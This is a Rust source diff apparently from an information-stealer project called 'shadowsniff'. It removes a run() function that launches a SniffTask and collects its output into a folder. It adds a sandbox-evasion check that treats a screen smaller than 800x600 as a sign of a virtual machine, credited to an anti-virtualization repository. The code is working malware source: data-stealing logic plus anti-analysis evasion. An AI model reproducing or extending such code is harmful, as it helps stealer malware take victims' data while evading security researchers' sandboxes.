@@ -23,34 +23,17 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  * SOFTWARE.
  */
+use crate::VmDetector;
+use windows_sys::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
 
-use alloc::format;
-use collector::atomic::AtomicCollector;
-use collector::display::PrimitiveDisplayCollector;
-use filesystem::path::Path;
-use filesystem::storage::StorageFileSystem;
-use filesystem::{FileSystem, FileSystemExt};
-use ipinfo::init_ip_info;
-use shadowsniff::SniffTask;
-use tasks::Task;
-use utils::log_debug;
+pub struct SmallScreenCheck;
 
-#[inline(always)]
-pub fn run() {
-    if !init_ip_info() {
-        panic!()
+impl VmDetector for SmallScreenCheck {
+    // Code adapted from: https://github.com/EvilBytecode/GoDefender/blob/c8dc6b434a976579d59ec5d62d5ef9457495b49a/AntiVirtualization/MonitorMetrics/monitormetrics.go
+    fn is_running_in_vm(&self) -> bool {
+        let (width, height) =
+            unsafe { (GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)) };
+
+        width < 800 || height < 600
     }
-
-    let fs = StorageFileSystem;
-    let out = &Path::new("output");
-    let _ = fs.remove_dir_all(out);
-    let _ = fs.mkdir(out);
-
-    let collector = AtomicCollector::default();
-
-    SniffTask::default().run(out, &fs, &collector);
-
-    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
-
-    log_debug!("{displayed_collector}");
 }
